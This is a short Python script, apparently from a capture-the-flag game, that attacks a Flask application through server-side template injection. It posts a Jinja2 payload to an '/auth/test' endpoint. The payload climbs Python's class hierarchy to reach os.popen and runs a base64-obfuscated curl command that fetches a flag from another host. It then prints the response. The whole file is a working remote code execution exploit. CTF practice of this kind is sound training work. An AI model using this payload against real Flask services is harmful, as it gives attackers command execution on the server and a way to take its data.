#!/usr/bin/env python
# encoding:utf-8

'''
Get flag by flask template render engine
'''

import requests
import base64

def get_flag(host, port):
    payload = '''{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ =='catch_warnings' %}{{c.__init__.func_globals['linecache'].__dict__['os'].popen("'''+"curl http://172.16.0.30:8000/flag".encode("base64").replace("\n", "")+'''".decode("base64")).read()}}{% endif %}{% endfor %}'''
    url = "http://%s:%d/auth/test" % (host, port)
    data = {"x":payload,"username":".ctf","password":base64.b64encode(".ctf")}
    print data
    response = requests.post(url, data=data, timeout=5)
    content = response.content
    print response.cookies
    print content
    return content

if __name__ == "__main__":
    get_flag("172.16.0.51", 80)

